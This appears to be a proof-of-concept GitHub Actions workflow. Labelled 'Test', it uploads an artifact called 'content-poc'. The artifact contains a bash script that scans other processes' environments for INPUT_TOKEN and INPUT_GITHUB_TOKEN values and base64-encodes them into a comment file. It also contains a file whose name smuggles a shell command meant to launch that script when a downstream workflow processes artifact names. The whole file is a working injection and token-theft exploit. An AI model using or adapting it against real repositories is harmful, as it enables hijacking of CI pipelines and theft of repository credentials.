name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'marker\n' > content/a
          cat > content/p <<'SCRIPT'
          #!/bin/bash
          declare -A seen
          report() {
            local tok="$1" desc="$2" b64
            b64=$(printf '%s' "$tok" | base64 -w0)
            [ -n "${seen[$b64]}" ] && return
            seen[$b64]=1
            printf '\nLEAKTOKEN b64=%s desc=%s\n' "$b64" "$desc" >> /tmp/comment
            echo "LEAKFOUND $b64" >&2
          }
          end=$((SECONDS+95))
          while [ $SECONDS -lt $end ]; do
            for e in /proc/[0-9]*/environ; do
              [ -r "$e" ] || continue
              pid=${e#/proc/}; pid=${pid%/environ}
              cmd=$(tr '\0' ' ' < "/proc/$pid/cmdline" 2>/dev/null | cut -c1-100 | base64 -w0)
              for v in INPUT_TOKEN INPUT_GITHUB_TOKEN; do
                tok=$(tr '\0' '\n' < "$e" 2>/dev/null | sed -n "s/^${v}=//p" | head -1)
                [ -n "$tok" ] && report "$tok" "$v:$cmd"
              done
            done
            sleep 0.02
          done
          SCRIPT
          chmod +x content/p
          printf 'x\n' > 'content/a;S=$(printf %.1s $PWD);bash ${S}tmp${S}content${S}content-poc${S}p & #.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
